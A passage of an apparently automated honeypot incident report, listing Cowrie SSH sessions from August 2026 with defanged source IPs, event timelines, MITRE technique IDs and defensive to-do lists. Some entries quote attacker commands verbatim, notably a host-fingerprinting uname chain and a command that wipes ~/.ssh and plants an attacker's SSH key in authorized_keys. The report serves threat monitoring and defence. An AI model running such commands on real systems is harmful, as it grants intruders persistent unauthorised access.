- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4344e4d2a733

| Field | Detail |
|---|---|
| **Source IP** | `93.118.164[.]193` |
| **First Seen** | 2026-08-21 06:19 |
| **Last Seen** | 2026-08-21 06:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:19:21` | `cowrie.session.connect` |
| `2026-08-21 06:19:22` | `cowrie.client.version` |
| `2026-08-21 06:19:22` | `cowrie.client.kex` |
| `2026-08-21 06:19:23` | `cowrie.login.success` |
| `2026-08-21 06:19:24` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.118.164[.]193` to AbuseIPDB if not already reported
- [ ] Block `93.118.164[.]193` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cd659d4a8d8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 06:22 |
| **Last Seen** | 2026-08-21 06:22 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:22:28` | `cowrie.session.connect` |
| `2026-08-21 06:22:29` | `cowrie.client.version` |
| `2026-08-21 06:22:29` | `cowrie.client.kex` |
| `2026-08-21 06:22:36` | `cowrie.login.success` |
| `2026-08-21 06:22:39` | `cowrie.session.params` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:39` | `cowrie.command.success` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:39` | `cowrie.command.input` |
| `2026-08-21 06:22:41` | `cowrie.log.closed` |
| `2026-08-21 06:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa0b789c5e1a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:25 |
| **Last Seen** | 2026-08-21 06:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:25:42` | `cowrie.session.connect` |
| `2026-08-21 06:25:42` | `cowrie.client.version` |
| `2026-08-21 06:25:42` | `cowrie.client.kex` |
| `2026-08-21 06:25:46` | `cowrie.login.success` |
| `2026-08-21 06:25:46` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:25:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:25:47` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:25:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02ff2ff74f35

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:25 |
| **Last Seen** | 2026-08-21 06:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:25:47` | `cowrie.session.connect` |
| `2026-08-21 06:25:47` | `cowrie.client.version` |
| `2026-08-21 06:25:47` | `cowrie.client.kex` |
| `2026-08-21 06:25:49` | `cowrie.login.success` |
| `2026-08-21 06:25:49` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:25:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:25:49` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9953feb4b3e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-21 06:26 |
| **Last Seen** | 2026-08-21 06:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:26:01` | `cowrie.session.connect` |
| `2026-08-21 06:26:02` | `cowrie.client.version` |
| `2026-08-21 06:26:03` | `cowrie.client.kex` |
| `2026-08-21 06:26:05` | `cowrie.login.success` |
| `2026-08-21 06:26:07` | `cowrie.session.params` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:07` | `cowrie.command.success` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:07` | `cowrie.command.input` |
| `2026-08-21 06:26:09` | `cowrie.log.closed` |
| `2026-08-21 06:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4484c3f2f408

| Field | Detail |
|---|---|
| **Source IP** | `195.218.159[.]123` |
| **First Seen** | 2026-08-21 06:26 |
| **Last Seen** | 2026-08-21 06:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:26:35` | `cowrie.session.connect` |
| `2026-08-21 06:26:35` | `cowrie.client.version` |
| `2026-08-21 06:26:35` | `cowrie.client.kex` |
| `2026-08-21 06:26:37` | `cowrie.login.success` |
| `2026-08-21 06:26:37` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.218.159[.]123` to AbuseIPDB if not already reported
- [ ] Block `195.218.159[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3f1e823096

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-21 06:26 |
| **Last Seen** | 2026-08-21 06:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:26:42` | `cowrie.session.connect` |
| `2026-08-21 06:26:43` | `cowrie.client.version` |
| `2026-08-21 06:26:43` | `cowrie.client.kex` |
| `2026-08-21 06:26:45` | `cowrie.login.success` |
| `2026-08-21 06:26:45` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4865c4f3d95

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-08-21 06:29 |
| **Last Seen** | 2026-08-21 06:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:29:06` | `cowrie.session.connect` |
| `2026-08-21 06:29:06` | `cowrie.client.version` |
| `2026-08-21 06:29:06` | `cowrie.client.kex` |
| `2026-08-21 06:29:07` | `cowrie.login.success` |
| `2026-08-21 06:29:08` | `cowrie.session.params` |
| `2026-08-21 06:29:08` | `cowrie.command.input` |
| `2026-08-21 06:29:08` | `cowrie.command.failed` |
| `2026-08-21 06:29:09` | `cowrie.log.closed` |
| `2026-08-21 06:29:10` | `cowrie.session.params` |
| `2026-08-21 06:29:10` | `cowrie.command.input` |
| `2026-08-21 06:29:10` | `cowrie.session.file_download` |
| `2026-08-21 06:29:10` | `cowrie.log.closed` |
| `2026-08-21 06:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3a2dfa978a

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-08-21 06:29 |
| **Last Seen** | 2026-08-21 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:29:10` | `cowrie.session.connect` |
| `2026-08-21 06:29:10` | `cowrie.client.version` |
| `2026-08-21 06:29:10` | `cowrie.client.kex` |
| `2026-08-21 06:29:11` | `cowrie.login.success` |
| `2026-08-21 06:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df10c4b80ce4

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-08-21 06:29 |
| **Last Seen** | 2026-08-21 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:29:12` | `cowrie.session.connect` |
| `2026-08-21 06:29:12` | `cowrie.client.version` |
| `2026-08-21 06:29:12` | `cowrie.client.kex` |
| `2026-08-21 06:29:13` | `cowrie.login.success` |
| `2026-08-21 06:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65215880d16

| Field | Detail |
|---|---|
| **Source IP** | `66.228.53[.]46` |
| **First Seen** | 2026-08-21 06:34 |
| **Last Seen** | 2026-08-21 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:34:27` | `cowrie.session.connect` |
| `2026-08-21 06:34:27` | `cowrie.login.success` |
| `2026-08-21 06:34:28` | `cowrie.session.params` |
| `2026-08-21 06:34:28` | `cowrie.command.input` |
| `2026-08-21 06:34:28` | `cowrie.command.input` |
| `2026-08-21 06:34:28` | `cowrie.command.failed` |
| `2026-08-21 06:34:28` | `cowrie.command.input` |
| `2026-08-21 06:34:28` | `cowrie.command.failed` |
| `2026-08-21 06:34:28` | `cowrie.command.input` |
| `2026-08-21 06:34:28` | `cowrie.log.closed` |
| `2026-08-21 06:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.228.53[.]46` to AbuseIPDB if not already reported
- [ ] Block `66.228.53[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec51c067d052

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:36 |
| **Last Seen** | 2026-08-21 06:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:36:01` | `cowrie.session.connect` |
| `2026-08-21 06:36:01` | `cowrie.client.version` |
| `2026-08-21 06:36:01` | `cowrie.client.kex` |
| `2026-08-21 06:36:02` | `cowrie.login.success` |
| `2026-08-21 06:36:02` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:36:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:36:02` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca5f0ae188f6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:36 |
| **Last Seen** | 2026-08-21 06:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:36:04` | `cowrie.session.connect` |
| `2026-08-21 06:36:04` | `cowrie.client.version` |
| `2026-08-21 06:36:04` | `cowrie.client.kex` |
| `2026-08-21 06:36:05` | `cowrie.login.success` |
| `2026-08-21 06:36:05` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:36:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:36:05` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f47ac3cd24e

| Field | Detail |
|---|---|
| **Source IP** | `218.95.73[.]31` |
| **First Seen** | 2026-08-21 06:42 |
| **Last Seen** | 2026-08-21 06:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:42:16` | `cowrie.session.connect` |
| `2026-08-21 06:42:17` | `cowrie.client.version` |
| `2026-08-21 06:42:17` | `cowrie.client.kex` |
| `2026-08-21 06:42:20` | `cowrie.login.success` |
| `2026-08-21 06:42:21` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.95.73[.]31` to AbuseIPDB if not already reported
- [ ] Block `218.95.73[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa272147ec1f

| Field | Detail |
|---|---|
| **Source IP** | `14.32.244[.]233` |
| **First Seen** | 2026-08-21 06:42 |
| **Last Seen** | 2026-08-21 06:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:42:26` | `cowrie.session.connect` |
| `2026-08-21 06:42:27` | `cowrie.client.version` |
| `2026-08-21 06:42:27` | `cowrie.client.kex` |
| `2026-08-21 06:42:30` | `cowrie.login.success` |
| `2026-08-21 06:42:30` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.32.244[.]233` to AbuseIPDB if not already reported
- [ ] Block `14.32.244[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bd8fd1b689b

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]101` |
| **First Seen** | 2026-08-21 06:44 |
| **Last Seen** | 2026-08-21 06:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:44:38` | `cowrie.session.connect` |
| `2026-08-21 06:44:39` | `cowrie.client.version` |
| `2026-08-21 06:44:39` | `cowrie.client.kex` |
| `2026-08-21 06:44:41` | `cowrie.login.success` |
| `2026-08-21 06:44:41` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]101` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d24d55e9a1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:46 |
| **Last Seen** | 2026-08-21 06:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:46:11` | `cowrie.session.connect` |
| `2026-08-21 06:46:12` | `cowrie.client.version` |
| `2026-08-21 06:46:12` | `cowrie.client.kex` |
| `2026-08-21 06:46:15` | `cowrie.login.success` |
| `2026-08-21 06:46:21` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb5000bc3d3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 06:46 |
| **Last Seen** | 2026-08-21 06:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:46:16` | `cowrie.session.connect` |
| `2026-08-21 06:46:17` | `cowrie.client.version` |
| `2026-08-21 06:46:17` | `cowrie.client.kex` |
| `2026-08-21 06:46:20` | `cowrie.login.success` |
| `2026-08-21 06:46:20` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:46:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 06:46:20` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0543f95cfc3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-21 06:47 |
| **Last Seen** | 2026-08-21 06:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:47:35` | `cowrie.session.connect` |
| `2026-08-21 06:47:35` | `cowrie.client.version` |
| `2026-08-21 06:47:35` | `cowrie.client.kex` |
| `2026-08-21 06:47:35` | `cowrie.login.success` |
| `2026-08-21 06:47:35` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:47:35` | `cowrie.direct-tcpip.data` |
| `2026-08-21 06:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fbbfb8a8ae2

| Field | Detail |
|---|---|
| **Source IP** | `177.159.150[.]111` |
| **First Seen** | 2026-08-21 06:49 |
| **Last Seen** | 2026-08-21 06:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:49:37` | `cowrie.session.connect` |
| `2026-08-21 06:49:38` | `cowrie.client.version` |
| `2026-08-21 06:49:38` | `cowrie.client.kex` |
| `2026-08-21 06:49:40` | `cowrie.login.success` |
| `2026-08-21 06:49:40` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.159.150[.]111` to AbuseIPDB if not already reported
- [ ] Block `177.159.150[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb967777e648

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]45` |
| **First Seen** | 2026-08-21 06:49 |
| **Last Seen** | 2026-08-21 06:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 06:49:49` | `cowrie.session.connect` |
| `2026-08-21 06:49:50` | `cowrie.client.version` |
| `2026-08-21 06:49:50` | `cowrie.client.kex` |
| `2026-08-21 06:49:52` | `cowrie.login.success` |
| `2026-08-21 06:49:53` | `cowrie.direct-tcpip.request` |
| `2026-08-21 06:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]45` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4b01828c5b6

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-21 06:52 |
| **Last Seen** | 2026-08-21 06:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
